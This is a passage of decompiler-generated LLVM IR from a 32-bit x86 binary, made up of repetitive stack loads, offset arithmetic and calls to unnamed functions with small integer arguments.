  %v2_80487e8 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_80487e8, i32* %eax.global-to-local, align 4
  %v0_80487ed = load i32, i32* @esp, align 4
  %v1_80487ed = inttoptr i32 %v0_80487ed to i32*
  %v3_80487ed = add i32 %v0_80487ed, 4
  %v0_80487ee = load i32, i32* @edi, align 4
  %v1_80487ee = add i32 %v0_80487ee, 20
  store i32 %v1_80487ee, i32* %edx.global-to-local, align 4
  %v1_80487f1 = inttoptr i32 %v3_80487ed to i32*
  %v2_80487f1 = load i32, i32* %v1_80487f1, align 4
  store i32 %v2_80487f1, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487ee, i32* %v1_80487f1, align 4
  %v1_80487f3 = add i32 %v0_80487ed, 10388
  store i32 %v1_80487f3, i32* %edx.global-to-local, align 4
  %v2_80487fa = add i32 %v1_80487f3, %v2_80487e8
  store i32 %v2_80487fa, i32* %eax.global-to-local, align 4
  store i32 %v2_80487fa, i32* %v1_80487ed, align 4
  %v3_80487fe = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487fe, i32* %eax.global-to-local, align 4
  %v0_8048803 = load i32, i32* @esp, align 4
  %v1_8048803 = inttoptr i32 %v0_8048803 to i32*
  %v2_8048803 = load i32, i32* %v1_8048803, align 4
  store i32 %v2_8048803, i32* @ebx, align 4
  %v1_8048804 = add i32 %v0_8048803, 10388
  store i32 %v1_8048804, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048804, i32* %v1_8048803, align 4
  %v2_804880c = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_804880c, i32* %eax.global-to-local, align 4
  %v0_8048811 = load i32, i32* @esp, align 4
  %v1_8048811 = inttoptr i32 %v0_8048811 to i32*
  %v2_8048811 = load i32, i32* %v1_8048811, align 4
  store i32 %v2_8048811, i32* %edx.global-to-local, align 4
  %v3_8048811 = add i32 %v0_8048811, 4
  %v1_8048812 = inttoptr i32 %v3_8048811 to i32*
  %v2_8048812 = load i32, i32* %v1_8048812, align 4
  store i32 %v2_8048812, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8052467.9 to i32), i32* %v1_8048812, align 4
  %v1_8048818 = add i32 %v0_8048811, 10388
  store i32 %v1_8048818, i32* %edx.global-to-local, align 4
  %v2_804881f = add i32 %v1_8048818, %v2_804880c
  store i32 %v2_804881f, i32* %eax.global-to-local, align 4
  store i32 %v2_804881f, i32* %v1_8048811, align 4
  %v3_8048823 = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048823, i32* %eax.global-to-local, align 4
  %v0_8048828 = load i32, i32* @esp, align 4
  %v1_8048828 = inttoptr i32 %v0_8048828 to i32*
  %v2_8048828 = load i32, i32* %v1_8048828, align 4
  store i32 %v2_8048828, i32* @ebx, align 4
  %v1_8048829 = add i32 %v0_8048828, 10388
  store i32 %v1_8048829, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048829, i32* %v1_8048828, align 4
  %v2_8048831 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8048831, i32* %eax.global-to-local, align 4
  %v0_8048836 = load i32, i32* @esp, align 4
  %v1_8048836 = inttoptr i32 %v0_8048836 to i32*
  %v3_8048836 = add i32 %v0_8048836, 4
  %v0_8048837 = load i32, i32* @edi, align 4
  %v1_8048837 = add i32 %v0_8048837, 789
  store i32 %v1_8048837, i32* %edx.global-to-local, align 4
  %v1_804883d = inttoptr i32 %v3_8048836 to i32*
  %v2_804883d = load i32, i32* %v1_804883d, align 4
  store i32 %v2_804883d, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048837, i32* %v1_804883d, align 4
  %v1_804883f = add i32 %v0_8048836, 10388
  store i32 %v1_804883f, i32* %edx.global-to-local, align 4
  %v2_8048846 = add i32 %v1_804883f, %v2_8048831
  store i32 %v2_8048846, i32* %eax.global-to-local, align 4
  store i32 %v2_8048846, i32* %v1_8048836, align 4
  %v3_804884a = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804884a, i32* %eax.global-to-local, align 4
  %v0_804884f = load i32, i32* @esp, align 4
  %v1_804884f = inttoptr i32 %v0_804884f to i32*
  %v2_804884f = load i32, i32* %v1_804884f, align 4
  store i32 %v2_804884f, i32* %eax.global-to-local, align 4
  %v1_8048850 = add i32 %v0_804884f, 10388
  store i32 %v1_8048850, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048850, i32* %v1_804884f, align 4
  %v2_8048858 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8048858, i32* %eax.global-to-local, align 4
  %v0_804885d = load i32, i32* @esp, align 4
  %v1_804885d = inttoptr i32 %v0_804885d to i32*
  %v2_804885d = load i32, i32* %v1_804885d, align 4
  store i32 %v2_804885d, i32* %ecx.global-to-local, align 4
  %v3_804885d = add i32 %v0_804885d, 4
  %v1_804885e = inttoptr i32 %v3_804885d to i32*
  %v2_804885e = load i32, i32* %v1_804885e, align 4
  store i32 %v2_804885e, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8052486.10 to i32), i32* %v1_804885e, align 4
  %v1_8048864 = add i32 %v0_804885d, 10388
  store i32 %v1_8048864, i32* %edx.global-to-local, align 4
  %v2_804886b = add i32 %v1_8048864, %v2_8048858
  store i32 %v2_804886b, i32* %eax.global-to-local, align 4
  store i32 %v2_804886b, i32* %v1_804885d, align 4
  %v3_804886f = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804886f, i32* %eax.global-to-local, align 4
  %v0_8048874 = load i32, i32* @esp, align 4
  %v1_8048874 = inttoptr i32 %v0_8048874 to i32*
  store i32 32, i32* %v1_8048874, align 4
  %v2_804887b = call i32 @function_804ec60(i8 %v1_804887b)
  store i32 %v2_804887b, i32* %eax.global-to-local, align 4
  %v0_8048880 = load i32, i32* @esp, align 4
  %v1_8048880 = inttoptr i32 %v0_8048880 to i32*
  %v2_8048880 = load i32, i32* %v1_8048880, align 4
  store i32 %v2_8048880, i32* %eax.global-to-local, align 4
  %v3_8048880 = add i32 %v0_8048880, 4
  %v1_8048881 = inttoptr i32 %v3_8048880 to i32*
  %v2_8048881 = load i32, i32* %v1_8048881, align 4
  store i32 %v2_8048881, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048881, align 4
  store i32 32, i32* %v1_8048880, align 4
  %v3_8048886 = call i32 @function_804ebb0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048886, i32* %eax.global-to-local, align 4
  store i32 %v3_8048886, i32* @ebx, align 4
  %v0_804888d = load i32, i32* @esp, align 4
  %v1_804888d = inttoptr i32 %v0_804888d to i32*
  %v2_804888d = load i32, i32* %v1_804888d, align 4
  store i32 %v2_804888d, i32* %eax.global-to-local, align 4
  %v1_804888e = add i32 %v0_804888d, 10388
  store i32 %v1_804888e, i32* %ecx.global-to-local, align 4
  store i32 %v1_804888e, i32* %v1_804888d, align 4
  %v2_8048896 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8048896, i32* %eax.global-to-local, align 4
  %v0_804889b = load i32, i32* @esp, align 4
  %v1_804889b = inttoptr i32 %v0_804889b to i32*
  %v2_804889b = load i32, i32* %v1_804889b, align 4
  store i32 %v2_804889b, i32* %edx.global-to-local, align 4
  %v3_804889b = add i32 %v0_804889b, 4
  %v1_804889c = inttoptr i32 %v3_804889b to i32*
  %v2_804889c = load i32, i32* %v1_804889c, align 4
  store i32 %v2_804889c, i32* %ecx.global-to-local, align 4
  %v0_804889d = load i32, i32* @ebx, align 4
  store i32 %v0_804889d, i32* %v1_804889c, align 4
  %v1_804889e = add i32 %v0_804889b, 10388
  store i32 %v1_804889e, i32* %edx.global-to-local, align 4
  %v2_80488a5 = add i32 %v1_804889e, %v2_8048896
  store i32 %v2_80488a5, i32* %eax.global-to-local, align 4
  store i32 %v2_80488a5, i32* %v1_804889b, align 4
  %v3_80488a9 = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80488a9, i32* %eax.global-to-local, align 4
  %v0_80488ae = load i32, i32* @esp, align 4
  %v1_80488ae = inttoptr i32 %v0_80488ae to i32*
  store i32 32, i32* %v1_80488ae, align 4
  %v2_80488b5 = call i32 @function_804ebe0(i8 %v1_804887b)
  store i32 %v2_80488b5, i32* %eax.global-to-local, align 4
  %v0_80488ba = load i32, i32* @esp, align 4
  %v1_80488ba = inttoptr i32 %v0_80488ba to i32*
  %v2_80488ba = load i32, i32* %v1_80488ba, align 4
  store i32 %v2_80488ba, i32* %eax.global-to-local, align 4
  %v1_80488bb = add i32 %v0_80488ba, 10388
  store i32 %v1_80488bb, i32* %ecx.global-to-local, align 4
  store i32 %v1_80488bb, i32* %v1_80488ba, align 4
  %v2_80488c3 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_80488c3, i32* %eax.global-to-local, align 4
  %v0_80488c8 = load i32, i32* @esp, align 4
  %v1_80488c8 = inttoptr i32 %v0_80488c8 to i32*
  %v2_80488c8 = load i32, i32* %v1_80488c8, align 4
  store i32 %v2_80488c8, i32* %ecx.global-to-local, align 4
  %v3_80488c8 = add i32 %v0_80488c8, 4
  %v1_80488c9 = inttoptr i32 %v3_80488c8 to i32*
  %v2_80488c9 = load i32, i32* %v1_80488c9, align 4
  store i32 %v2_80488c9, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8052486.10 to i32), i32* %v1_80488c9, align 4
  %v1_80488cf = add i32 %v0_80488c8, 10388
  store i32 %v1_80488cf, i32* %edx.global-to-local, align 4
  %v2_80488d6 = add i32 %v1_80488cf, %v2_80488c3
  store i32 %v2_80488d6, i32* %eax.global-to-local, align 4
  store i32 %v2_80488d6, i32* %v1_80488c8, align 4
  %v3_80488da = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80488da, i32* %eax.global-to-local, align 4
  %v0_80488df = load i32, i32* @esp, align 4
  %v1_80488df = inttoptr i32 %v0_80488df to i32*
  store i32 33, i32* %v1_80488df, align 4
  %v2_80488e6 = call i32 @function_804ec60(i8 %v1_804887b)
  store i32 %v2_80488e6, i32* %eax.global-to-local, align 4
  %v0_80488eb = load i32, i32* @esp, align 4
  %v1_80488eb = inttoptr i32 %v0_80488eb to i32*
  %v2_80488eb = load i32, i32* %v1_80488eb, align 4
  store i32 %v2_80488eb, i32* %eax.global-to-local, align 4
  %v3_80488eb = add i32 %v0_80488eb, 4
  %v1_80488ec = inttoptr i32 %v3_80488eb to i32*
  %v2_80488ec = load i32, i32* %v1_80488ec, align 4
  store i32 %v2_80488ec, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_80488ec, align 4
  store i32 33, i32* %v1_80488eb, align 4
  %v3_80488f1 = call i32 @function_804ebb0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80488f1, i32* %eax.global-to-local, align 4
  store i32 %v3_80488f1, i32* @ebx, align 4
  %v0_80488f8 = load i32, i32* @esp, align 4
  %v1_80488f8 = inttoptr i32 %v0_80488f8 to i32*
  %v2_80488f8 = load i32, i32* %v1_80488f8, align 4
  store i32 %v2_80488f8, i32* %eax.global-to-local, align 4
  %v1_80488f9 = add i32 %v0_80488f8, 10388
  store i32 %v1_80488f9, i32* %ecx.global-to-local, align 4
  store i32 %v1_80488f9, i32* %v1_80488f8, align 4
  %v2_8048901 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8048901, i32* %eax.global-to-local, align 4
  %v0_8048906 = load i32, i32* @esp, align 4
  %v1_8048906 = inttoptr i32 %v0_8048906 to i32*
  %v2_8048906 = load i32, i32* %v1_8048906, align 4
  store i32 %v2_8048906, i32* %edx.global-to-local, align 4
  %v3_8048906 = add i32 %v0_8048906, 4
  %v1_8048907 = inttoptr i32 %v3_8048906 to i32*
  %v2_8048907 = load i32, i32* %v1_8048907, align 4
  store i32 %v2_8048907, i32* %ecx.global-to-local, align 4
  %v0_8048908 = load i32, i32* @ebx, align 4
  store i32 %v0_8048908, i32* %v1_8048907, align 4
  %v1_8048909 = add i32 %v0_8048906, 10388
  store i32 %v1_8048909, i32* %edx.global-to-local, align 4
  %v2_8048910 = add i32 %v1_8048909, %v2_8048901
  store i32 %v2_8048910, i32* %eax.global-to-local, align 4
  store i32 %v2_8048910, i32* %v1_8048906, align 4
  %v3_8048914 = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048914, i32* %eax.global-to-local, align 4
  %v0_8048919 = load i32, i32* @esp, align 4
  %v1_8048919 = inttoptr i32 %v0_8048919 to i32*
  store i32 33, i32* %v1_8048919, align 4
  %v2_8048920 = call i32 @function_804ebe0(i8 %v1_804887b)
  store i32 %v2_8048920, i32* %eax.global-to-local, align 4
  %v0_8048925 = load i32, i32* @esp, align 4
  %v1_8048925 = inttoptr i32 %v0_8048925 to i32*
  %v2_8048925 = load i32, i32* %v1_8048925, align 4
  store i32 %v2_8048925, i32* %eax.global-to-local, align 4
  %v1_8048926 = add i32 %v0_8048925, 10388
  store i32 %v1_8048926, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048926, i32* %v1_8048925, align 4
  %v2_804892e = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_804892e, i32* %eax.global-to-local, align 4
  %v0_8048933 = load i32, i32* @esp, align 4
  %v1_8048933 = inttoptr i32 %v0_8048933 to i32*
  %v2_8048933 = load i32, i32* %v1_8048933, align 4
  store i32 %v2_8048933, i32* %ecx.global-to-local, align 4
  %v3_8048933 = add i32 %v0_8048933, 4
  %v1_8048934 = inttoptr i32 %v3_8048933 to i32*
  %v2_8048934 = load i32, i32* %v1_8048934, align 4
  store i32 %v2_8048934, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8052486.10 to i32), i32* %v1_8048934, align 4
  %v1_804893a = add i32 %v0_8048933, 10388
  store i32 %v1_804893a, i32* %edx.global-to-local, align 4
  %v2_8048941 = add i32 %v1_804893a, %v2_804892e
  store i32 %v2_8048941, i32* %eax.global-to-local, align 4
  store i32 %v2_8048941, i32* %v1_8048933, align 4
  %v3_8048945 = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048945, i32* %eax.global-to-local, align 4
  %v0_804894a = load i32, i32* @esp, align 4
  %v1_804894a = inttoptr i32 %v0_804894a to i32*
  store i32 34, i32* %v1_804894a, align 4
  %v2_8048951 = call i32 @function_804ec60(i8 %v1_804887b)
  store i32 %v2_8048951, i32* %eax.global-to-local, align 4
  %v0_8048956 = load i32, i32* @esp, align 4
  %v1_8048956 = inttoptr i32 %v0_8048956 to i32*
  %v2_8048956 = load i32, i32* %v1_8048956, align 4
  store i32 %v2_8048956, i32* %eax.global-to-local, align 4
  %v3_8048956 = add i32 %v0_8048956, 4
  %v1_8048957 = inttoptr i32 %v3_8048956 to i32*
  %v2_8048957 = load i32, i32* %v1_8048957, align 4
  store i32 %v2_8048957, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048957, align 4
  store i32 34, i32* %v1_8048956, align 4
  %v3_804895c = call i32 @function_804ebb0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804895c, i32* %eax.global-to-local, align 4
  store i32 %v3_804895c, i32* @ebx, align 4
  %v0_8048963 = load i32, i32* @esp, align 4
  %v1_8048963 = inttoptr i32 %v0_8048963 to i32*
  %v2_8048963 = load i32, i32* %v1_8048963, align 4
  store i32 %v2_8048963, i32* %eax.global-to-local, align 4
  %v1_8048964 = add i32 %v0_8048963, 10388
  store i32 %v1_8048964, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048964, i32* %v1_8048963, align 4
  %v2_804896c = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_804896c, i32* %eax.global-to-local, align 4
  %v0_8048971 = load i32, i32* @esp, align 4
  %v1_8048971 = inttoptr i32 %v0_8048971 to i32*
  %v2_8048971 = load i32, i32* %v1_8048971, align 4
  store i32 %v2_8048971, i32* %edx.global-to-local, align 4
  %v3_8048971 = add i32 %v0_8048971, 4
  %v1_8048972 = inttoptr i32 %v3_8048971 to i32*
  %v2_8048972 = load i32, i32* %v1_8048972, align 4
  store i32 %v2_8048972, i32* %ecx.global-to-local, align 4
  %v0_8048973 = load i32, i32* @ebx, align 4
  store i32 %v0_8048973, i32* %v1_8048972, align 4
  %v1_8048974 = add i32 %v0_8048971, 10388
  store i32 %v1_8048974, i32* %edx.global-to-local, align 4
  %v2_804897b = add i32 %v1_8048974, %v2_804896c
  store i32 %v2_804897b, i32* %eax.global-to-local, align 4
  store i32 %v2_804897b, i32* %v1_8048971, align 4
  %v3_804897f = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804897f, i32* %eax.global-to-local, align 4
  %v0_8048984 = load i32, i32* @esp, align 4
  %v1_8048984 = inttoptr i32 %v0_8048984 to i32*
  store i32 34, i32* %v1_8048984, align 4
  %v2_804898b = call i32 @function_804ebe0(i8 %v1_804887b)
  store i32 %v2_804898b, i32* %eax.global-to-local, align 4
  %v0_8048990 = load i32, i32* @esp, align 4
  %v1_8048990 = inttoptr i32 %v0_8048990 to i32*
  %v1_8048991 = add i32 %v0_8048990, 10388
  store i32 %v1_8048991, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048991, i32* %v1_8048990, align 4
  %v2_8048999 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8048999, i32* %eax.global-to-local, align 4
  %v0_804899e = load i32, i32* @esp, align 4
  %v1_804899e = inttoptr i32 %v0_804899e to i32*
  %v2_804899e = load i32, i32* %v1_804899e, align 4
  store i32 %v2_804899e, i32* @ebx, align 4
  %v3_804899e = add i32 %v0_804899e, 4
  %v1_804899f = inttoptr i32 %v3_804899e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052486.10 to i32), i32* %v1_804899f, align 4
  %v1_80489a5 = add i32 %v0_804899e, 10388
  store i32 %v1_80489a5, i32* %edx.global-to-local, align 4
  %v2_80489ac = add i32 %v1_80489a5, %v2_8048999
  store i32 %v2_80489ac, i32* %eax.global-to-local, align 4
  store i32 %v2_80489ac, i32* %v1_804899e, align 4
  %v3_80489b0 = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80489b0, i32* %eax.global-to-local, align 4
  %v0_80489b5 = load i32, i32* @esp, align 4
  %v1_80489b5 = add i32 %v0_80489b5, 16
  %v1_80489b8 = add i32 %v0_80489b5, 68
  %v2_80489b8 = inttoptr i32 %v1_80489b8 to i32*
  %v3_80489b8 = load i32, i32* %v2_80489b8, align 4
  store i32 %v3_80489b8, i32* %ecx.global-to-local, align 4
  %v1_80489bc = icmp eq i32 %v3_80489b8, 0
  store i1 %v1_80489bc, i1* %zf.global-to-local, align 1
  br i1 %v1_80489bc, label %dec_label_pc_8048ad8, label %dec_label_pc_80489c4

dec_label_pc_80489c4:                             ; preds = %dec_label_pc_8048700
  %v9_80489c4 = icmp eq i32 %v0_80489b5, -4
  store i1 %v9_80489c4, i1* %zf.global-to-local, align 1
  %v2_80489c7 = inttoptr i32 %v0_80489b5 to i32*
  store i32 35, i32* %v2_80489c7, align 4
  %v2_80489c9 = call i32 @function_804ec60(i8 %v1_804887b)
  store i32 %v2_80489c9, i32* %eax.global-to-local, align 4
  %v0_80489ce = load i32, i32* @esp, align 4
  %v1_80489ce = inttoptr i32 %v0_80489ce to i32*
  %v2_80489ce = load i32, i32* %v1_80489ce, align 4
  store i32 %v2_80489ce, i32* %eax.global-to-local, align 4
  %v3_80489ce = add i32 %v0_80489ce, 4
  %v1_80489cf = inttoptr i32 %v3_80489ce to i32*
  %v2_80489cf = load i32, i32* %v1_80489cf, align 4
  store i32 %v2_80489cf, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_80489cf, align 4
  store i32 35, i32* %v1_80489ce, align 4
  %v3_80489d4 = call i32 @function_804ebb0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80489d4, i32* %eax.global-to-local, align 4
  store i32 %v3_80489d4, i32* @ebx, align 4
  %v0_80489db = load i32, i32* @esp, align 4
  %v1_80489db = inttoptr i32 %v0_80489db to i32*
  %v2_80489db = load i32, i32* %v1_80489db, align 4
  store i32 %v2_80489db, i32* %eax.global-to-local, align 4
  %v1_80489dc = add i32 %v0_80489db, 10388
  store i32 %v1_80489dc, i32* %ecx.global-to-local, align 4
  store i32 %v1_80489dc, i32* %v1_80489db, align 4
  %v2_80489e4 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_80489e4, i32* %eax.global-to-local, align 4
  %v0_80489e9 = load i32, i32* @esp, align 4
  %v1_80489e9 = inttoptr i32 %v0_80489e9 to i32*
  %v2_80489e9 = load i32, i32* %v1_80489e9, align 4
  store i32 %v2_80489e9, i32* %edx.global-to-local, align 4
  %v3_80489e9 = add i32 %v0_80489e9, 4
  %v1_80489ea = inttoptr i32 %v3_80489e9 to i32*
  %v2_80489ea = load i32, i32* %v1_80489ea, align 4
  store i32 %v2_80489ea, i32* %ecx.global-to-local, align 4
  %v0_80489eb = load i32, i32* @ebx, align 4
  store i32 %v0_80489eb, i32* %v1_80489ea, align 4
  %v1_80489ec = add i32 %v0_80489e9, 10388
  store i32 %v1_80489ec, i32* %edx.global-to-local, align 4
  %v2_80489f3 = add i32 %v1_80489ec, %v2_80489e4
  store i32 %v2_80489f3, i32* %eax.global-to-local, align 4
  store i32 %v2_80489f3, i32* %v1_80489e9, align 4
  %v3_80489f7 = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80489f7, i32* %eax.global-to-local, align 4
  %v0_80489fc = load i32, i32* @esp, align 4
  %v1_80489fc = inttoptr i32 %v0_80489fc to i32*
  store i32 35, i32* %v1_80489fc, align 4
  %v2_8048a03 = call i32 @function_804ebe0(i8 %v1_804887b)
  store i32 %v2_8048a03, i32* %eax.global-to-local, align 4
  %v0_8048a08 = load i32, i32* @esp, align 4
  %v1_8048a08 = inttoptr i32 %v0_8048a08 to i32*
  %v2_8048a08 = load i32, i32* %v1_8048a08, align 4
  store i32 %v2_8048a08, i32* %eax.global-to-local, align 4
  %v1_8048a09 = add i32 %v0_8048a08, 10388
  store i32 %v1_8048a09, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a09, i32* %v1_8048a08, align 4
  %v2_8048a11 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8048a11, i32* %eax.global-to-local, align 4
  %v0_8048a16 = load i32, i32* @esp, align 4
  %v1_8048a16 = inttoptr i32 %v0_8048a16 to i32*
  %v2_8048a16 = load i32, i32* %v1_8048a16, align 4
  store i32 %v2_8048a16, i32* %ecx.global-to-local, align 4
  %v3_8048a16 = add i32 %v0_8048a16, 4
  %v1_8048a17 = inttoptr i32 %v3_8048a16 to i32*
  %v2_8048a17 = load i32, i32* %v1_8048a17, align 4
  store i32 %v2_8048a17, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8052486.10 to i32), i32* %v1_8048a17, align 4
  %v1_8048a1d = add i32 %v0_8048a16, 10388
  store i32 %v1_8048a1d, i32* %edx.global-to-local, align 4
  %v2_8048a24 = add i32 %v1_8048a1d, %v2_8048a11
  store i32 %v2_8048a24, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a24, i32* %v1_8048a16, align 4
  %v3_8048a28 = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048a28, i32* %eax.global-to-local, align 4
  %v0_8048a2d = load i32, i32* @esp, align 4
  %v1_8048a2d = inttoptr i32 %v0_8048a2d to i32*
  %v2_8048a2d = load i32, i32* %v1_8048a2d, align 4
  store i32 %v2_8048a2d, i32* %eax.global-to-local, align 4
  %v3_8048a2d = add i32 %v0_8048a2d, 4
  %v1_8048a2e = inttoptr i32 %v3_8048a2d to i32*
  %v2_8048a2e = load i32, i32* %v1_8048a2e, align 4
  store i32 %v2_8048a2e, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048a2e, align 4
  store i32 40, i32* %v1_8048a2d, align 4
  %v3_8048a33 = call i32 @function_804ebb0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048a33, i32* %eax.global-to-local, align 4
  store i32 %v3_8048a33, i32* @ebx, align 4
  %v0_8048a3a = load i32, i32* @esp, align 4
  %v1_8048a3a = inttoptr i32 %v0_8048a3a to i32*
  %v2_8048a3a = load i32, i32* %v1_8048a3a, align 4
  store i32 %v2_8048a3a, i32* %eax.global-to-local, align 4
  %v1_8048a3b = add i32 %v0_8048a3a, 10388
  store i32 %v1_8048a3b, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a3b, i32* %v1_8048a3a, align 4
  %v2_8048a43 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8048a43, i32* %eax.global-to-local, align 4
  %v0_8048a48 = load i32, i32* @esp, align 4
  %v1_8048a48 = inttoptr i32 %v0_8048a48 to i32*
  %v2_8048a48 = load i32, i32* %v1_8048a48, align 4
  store i32 %v2_8048a48, i32* %edx.global-to-local, align 4
  %v3_8048a48 = add i32 %v0_8048a48, 4
  %v1_8048a49 = inttoptr i32 %v3_8048a48 to i32*
  %v2_8048a49 = load i32, i32* %v1_8048a49, align 4
  store i32 %v2_8048a49, i32* %ecx.global-to-local, align 4
  %v0_8048a4a = load i32, i32* @ebx, align 4
  store i32 %v0_8048a4a, i32* %v1_8048a49, align 4
  %v1_8048a4b = add i32 %v0_8048a48, 10388
  store i32 %v1_8048a4b, i32* %edx.global-to-local, align 4
  %v2_8048a52 = add i32 %v1_8048a4b, %v2_8048a43
  store i32 %v2_8048a52, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a52, i32* %v1_8048a48, align 4
  %v3_8048a56 = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048a56, i32* %eax.global-to-local, align 4
  %v0_8048a5b = load i32, i32* @esp, align 4
  %v1_8048a5b = inttoptr i32 %v0_8048a5b to i32*
  %v2_8048a5b = load i32, i32* %v1_8048a5b, align 4
  store i32 %v2_8048a5b, i32* @ebx, align 4
  %v1_8048a5c = add i32 %v0_8048a5b, 10388
  store i32 %v1_8048a5c, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a5c, i32* %v1_8048a5b, align 4
  %v2_8048a64 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8048a64, i32* %eax.global-to-local, align 4
  %v0_8048a69 = load i32, i32* @esp, align 4
  %v1_8048a69 = inttoptr i32 %v0_8048a69 to i32*
  %v2_8048a69 = load i32, i32* %v1_8048a69, align 4
  store i32 %v2_8048a69, i32* %edx.global-to-local, align 4
  %v3_8048a69 = add i32 %v0_8048a69, 4
  %v1_8048a6a = inttoptr i32 %v3_8048a69 to i32*
  %v2_8048a6a = load i32, i32* %v1_8048a6a, align 4
  store i32 %v2_8048a6a, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805247f.7 to i32), i32* %v1_8048a6a, align 4
  %v1_8048a70 = add i32 %v0_8048a69, 10388
  store i32 %v1_8048a70, i32* %edx.global-to-local, align 4
  %v2_8048a77 = add i32 %v1_8048a70, %v2_8048a64
  store i32 %v2_8048a77, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a77, i32* %v1_8048a69, align 4
  %v3_8048a7b = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048a7b, i32* %eax.global-to-local, align 4
  %v0_8048a80 = load i32, i32* @esp, align 4
  %v1_8048a80 = inttoptr i32 %v0_8048a80 to i32*
  %v2_8048a80 = load i32, i32* %v1_8048a80, align 4
  store i32 %v2_8048a80, i32* %eax.global-to-local, align 4
  %v1_8048a81 = add i32 %v0_8048a80, 10388
  store i32 %v1_8048a81, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a81, i32* %v1_8048a80, align 4
  %v2_8048a89 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8048a89, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a89, i32* @ebx, align 4
  %v0_8048a90 = load i32, i32* @esp, align 4
  %v1_8048a90 = inttoptr i32 %v0_8048a90 to i32*
  %v2_8048a90 = load i32, i32* %v1_8048a90, align 4
  store i32 %v2_8048a90, i32* %eax.global-to-local, align 4
  %v1_8048a91 = add i32 %v0_8048a90, 68
  %v2_8048a91 = inttoptr i32 %v1_8048a91 to i32*
  %v3_8048a91 = load i32, i32* %v2_8048a91, align 4
  store i32 %v3_8048a91, i32* %eax.global-to-local, align 4
  store i32 %v3_8048a91, i32* %v1_8048a90, align 4
  %v2_8048a96 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8048a96, i32* %eax.global-to-local, align 4
  %v0_8048a9b = load i32, i32* @esp, align 4
  %v1_8048a9e = add i32 %v0_8048a9b, 10388
  %v1_8048aa5 = load i32, i32* @ebx, align 4
  %v2_8048aa5 = add i32 %v1_8048a9e, %v1_8048aa5
  %v12_8048aa5 = icmp eq i32 %v2_8048aa5, 0
  store i1 %v12_8048aa5, i1* %zf.global-to-local, align 1
  store i32 %v2_8048aa5, i32* %edx.global-to-local, align 4
